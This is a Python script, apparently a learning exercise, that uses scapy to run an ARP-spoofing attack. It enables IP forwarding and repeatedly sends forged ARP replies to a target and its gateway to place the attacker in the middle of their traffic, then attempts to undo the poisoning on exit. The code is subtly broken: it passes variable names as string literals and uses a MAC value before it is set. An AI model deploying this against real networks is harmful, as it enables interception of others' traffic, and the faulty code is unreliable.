import os
import scapy.all as scp
import time
import optparse



os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
def begin():
    parse=optparse.OptionParser()
    parse.add_option("-t","--target",dest="target_ip",help="Enter the target ip")
    parse.add_option("-r","--host",dest="modem_ip",help="Enter the Modem ip")
    settings=parse.parse_args()[0]
    if not settings.target_ip:
        print("Enter one target ip")
    if not settings.modem_ip:
        print("Enter one modem ip")
    return settings


def scan(ip):
    req_packet=scp.ARP(pdst=ip)
    stream_packet=scp.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scp.ls(scp.Ether())
    packet=stream_packet/req_packet
    main_packet=scp.srp(packet,timeout=1,verbose=False)[0]
    return main_packet[0][1].hwsrc



def arpas(ip1,ip2):

    mac_scan=scan(ip1)
    arp_as=scp.ARP(op=2,pdst="ip1",hwdst="mac_scan",psrc="ip2")
    #scp.ls(scp.ARP)
    scp.send(arp_as,verbose=False)


def reset(ip11, ip22):
    mac_scan = scan(ip11)
    arp_as = scp.ARP(op=2, pdst="ip11", hwdst="mac_scan", psrc="ip22",hwsrc="other_mac")
    # scp.ls(scp.ARP)
    other_mac=scan(ip22)
    scp.send(arp_as, verbose=False, count=5)




beg=begin()
target=beg.target_ip
modem=beg.modem_ip




count=0
try:
    while True:
        arpas(target,modem)
        arpas(modem,target)
        count +=2
        print("\rSending packets" + str(count),end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("\nLeaving... ")
    reset(target, modem)
    reset(modem, target)